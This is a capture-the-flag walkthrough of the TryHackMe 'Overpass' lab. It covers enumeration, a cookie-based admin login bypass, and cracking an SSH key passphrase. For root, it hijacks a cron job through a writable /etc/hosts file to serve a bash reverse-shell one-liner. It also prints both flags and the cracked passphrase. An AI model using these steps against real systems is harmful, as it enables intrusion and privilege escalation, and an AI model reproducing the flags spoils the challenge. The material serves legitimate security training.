## Overpass - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/overpass)

<i>What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!

There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?

UPDATE: The code is now claimed.
The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.</i>

**IP: 10.10.196.17**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web, Hash Cracking, OWASP TOP 10 <br>

**Tools Used**: Nmap, Gobuster, John The Ripper<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.196.17

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
  |   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
  |_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
  80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
  |_http-title: Overpass
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.196.17 -w /usr/share/wordlists/dirb/common.txt

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /aboutus              (Status: 301) [Size: 0] [--> aboutus/]
  /admin                (Status: 301) [Size: 42] [--> /admin/]
  /css                  (Status: 301) [Size: 0] [--> css/]
  /downloads            (Status: 301) [Size: 0] [--> downloads/]
  /img                  (Status: 301) [Size: 0] [--> img/]
  /index.html           (Status: 301) [Size: 0] [--> ./]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- That `admin` directory looks suspicious so let's visit it `http://10.10.196.17/admin/`. Perfect, it's a login page.

- So right here, I took some time trying different SQLI options in order to bypass authentication but nothing worked. After that, I started exploring previous web pages in order to find a new clue, and I did.
  In the login page source code you can find a `/login.js` file with valuable info!

  ```
  }
  async function login() {
      const usernameBox = document.querySelector("#username");
      const passwordBox = document.querySelector("#password");
      const loginStatus = document.querySelector("#loginStatus");
      loginStatus.textContent = ""
      const creds = { username: usernameBox.value, password: passwordBox.value }
      const response = await postData("/api/login", creds)
      const statusOrCookie = await response.text()
      if (statusOrCookie === "Incorrect credentials") {
          loginStatus.textContent = "Incorrect Credentials"
          passwordBox.value=""
      } else {
          Cookies.set("SessionToken",statusOrCookie)
          window.location = "/admin"
      }
  }
  ```
  
- Now we know that login page needs a token/cookie in order for us to access it, so let's create one. Open developer tools on login page, go to Storage and click on + sign and it will create a new cookie for you.
  Now just change the name of that cookie to `SessionToken` as it is required per `/login.js` file and reload the page. Voila, you are in the admin panel.

  ```
  Welcome to the Overpass Administrator area
  A secure password manager with support for Windows, Linux, MacOS and more
  
  Since you keep forgetting your password, James, I've set up SSH keys for you.
  
  If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
  Also, we really need to talk about this "Military Grade" encryption. - Paradox
  
  -----BEGIN RSA PRIVATE KEY-----
  Proc-Type: 4,ENCRYPTED
  DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337
  
  [SNIP!]
  -----END RSA PRIVATE KEY-----
  ```

- Now comes the easy part. Save the RSA Key, convert it to hash and crack it in order to get a passphrase. Change the permission of `id_rsa` to 600 and login with SSH with found credentials and passphrase.

  ```
  mousepad id_rsa
  
  ssh2john id_rsa > james.hash
  
  john --wordlist=/rockyou.txt james.hash 
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
  Cost 2 (iteration count) is 1 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  james13          (id_rsa)     
  1g 0:00:00:00 DONE (2025-05-12 14:14) 100.0g/s 1337Kp/s 1337Kc/s 1337KC/s lisa..honolulu
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
  
  chmod 600 id_rsa

  ssh -i id_rsa james@10.10.196.17

  Enter passphrase for key 'id_rsa': 
  Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)
  [SNIP!]
  james@overpass-prod:~$ whoami
  james
  james@overpass-prod:~$ id
  uid=1001(james) gid=1001(james) groups=1001(james)
  ```

---

## 🧍 User Privilege Escalation

- Usual procedure for finding the user flag.

  ```
  james@overpass-prod:~$ ls -al
  total 48
  drwxr-xr-x 6 james james 4096 Jun 27  2020 .
  drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
  lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
  -rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
  -rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
  drwx------ 2 james james 4096 Jun 27  2020 .cache
  drwx------ 3 james james 4096 Jun 27  2020 .gnupg
  drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
  -rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
  -rw-r--r-- 1 james james  807 Jun 27  2020 .profile
  drwx------ 2 james james 4096 Jun 27  2020 .ssh
  -rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
  -rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
  
  james@overpass-prod:~$ cat user.txt 
  thm{65c1aaf000506e56996822c6281e6bf7}
  ```
  
- Let's escalate now.

---

## 👑 Root Privilege Escalation

- OK, this one took a bit since I was running a server from wrong directory, I'll explain everything no worries. I did a lot of enumeration and these are the findings that will get us to root.

  ```
  james@overpass-prod:~$ cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # m h dom mon dow user  command
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  # Update builds from latest code
  * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
  ```

  ```
  james@overpass-prod:~$ find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
  dev/char
  dev/fd
  dev/full
  dev/fuse
  dev/log
  dev/mqueue
  dev/net
  dev/null
  dev/ptmx
  dev/pts
  dev/random
  dev/shm
  dev/stderr
  dev/stdin
  dev/stdout
  dev/tty
  dev/urandom
  dev/zero
  etc/hosts
  etc/systemd
  home/james
  lib/systemd
  run/acpid.socket
  run/dbus
  run/lock
  run/screen
  run/shm
  run/systemd
  run/user
  run/uuidd
  sys/fs
  sys/kernel
  tmp
  tmp/.ICE-unix
  tmp/.Test-unix
  tmp/.X11-unix
  tmp/.XIM-unix
  tmp/.font-unix
  var/crash
  var/lock
  var/tmp
  ```
  
- We see that cronjobs are running curl every minute which will download the script from specific server. After enumerating writeable files, you can see that we have write permission to `/etc/hosts`. Let's confirm that real quick.

  ```
  james@overpass-prod:~$ ls -al /etc/hosts
  -rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
  ```
  
- Perfect, so now what we want to do is to edit the `/etc/hosts` so that the cronjobs can download a reverse shell from our server and not from Overpass server. You just have to replace one IP in `/etc/hosts` with [YOUR-THM-IP] and save the file, leave everything else as it is.

  ```
  nano /etc/hosts

  127.0.0.1 localhost
  127.0.1.1 overpass-prod
  [YOUR-THM-IP] overpass.thm
  
  james@overpass-prod:~$ cat /etc/hosts
  127.0.0.1 localhost
  127.0.1.1 overpass-prod
  [YOUR-THM-IP] overpass.thm
  # The following lines are desirable for IPv6 capable hosts
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters
  ```

- After checking cronjobs we can see the full path for downloading the script `overpass.thm/downloads/src/buildscript.sh` which means we have to create exact same path like this. Go to your home directory `~` and create `/downloads/src`.
  Then in `/downloads/src` we will add our reverse shell as `buildscript.sh`. Here you can use any reverse shell that you like or even use something like `cat /root/root.txt` and then save the output somewhere where you can read it.
  It's up to you, I used simple bash one liner that I use most of the time.

  ```
  mousepad buildscript.sh

  #!/bin/bash
  
  bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1
  
  cat buildscript.sh 
  #!/bin/bash
  
  bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1
  ```

- For this part important note. You must run Python HTTP from your home directory `~` and not from the directory where reverse shell is othervise it won't work.
  Cronjobs takes a full path to the script in order to download it and if you are running a server from `/downloads/src` simply that path doesn't exist. Don't make the same mistake as me lol!
  After starting a server, start a listener on another terminal and after a minute you will get a root shell. From that point on just read the flag.

  ```
  sudo python3 -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.196.17 - - [12/May/2025 14:55:01] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.196.17] 43158
  bash: cannot set terminal process group (1217): Inappropriate ioctl for device
  bash: no job control in this shell
  root@overpass-prod:~# whoami
  whoami
  root
  
  root@overpass-prod:~# id
  id
  uid=0(root) gid=0(root) groups=0(root)
  
  root@overpass-prod:~# cat /root/root.txt
  cat /root/root.txt
  thm{7f336f8c359dbac18d54fdd64ea753bb}
  ```

---

## 🏁 Flags

- **User Flag**: `thm{65c1aaf000506e56996822c6281e6bf7}`
- **Root Flag**: `thm{7f336f8c359dbac18d54fdd64ea753bb}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Finding the right exploitation methods.`

- What did I learn?
  `New way of exploiting the cronjobs.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
